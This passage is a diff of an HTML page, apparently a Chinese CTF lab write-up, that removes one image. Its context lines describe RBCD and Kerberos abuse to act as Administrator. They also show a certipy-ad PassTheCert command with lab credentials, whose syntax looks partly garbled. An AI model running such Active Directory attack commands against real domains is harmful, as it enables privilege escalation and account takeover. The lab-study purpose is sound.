@@ -802,7 +802,6 @@ klist <span class="token parameter variable">-c</span> administrator.ccache<span
 <p>利用 <strong>RBCD + Kerberos TGS</strong> 权限，在 XR-0687 上以 <strong>Administrator 身份</strong>执行命令</p>
 <p>注意bug：这里如果重复了，重新创建一个TEST用户</p>
 <p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5cc9b7b1ba5c004671a725a78c9f0abc.png"></p>
-<p><img src="https://gkjzjh146.github.io/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98.assets/image-20231008132053598.png" alt="image-20231008132053598"></p>
 <hr>
 <h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><h5 id="第二条链：证书滥用-PassTheCert"><a href="#第二条链：证书滥用-PassTheCert" class="headerlink" title="第二条链：证书滥用 + PassTheCert"></a>第二条链：证书滥用 + PassTheCert</h5><pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad zaccount create lixiuying@xiaorang.lab -p winniethepooh -dc -ip 172.22.15.13 -user Test2 -pass Test1234 dns 'XR-DC01.xiaorang.lab'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
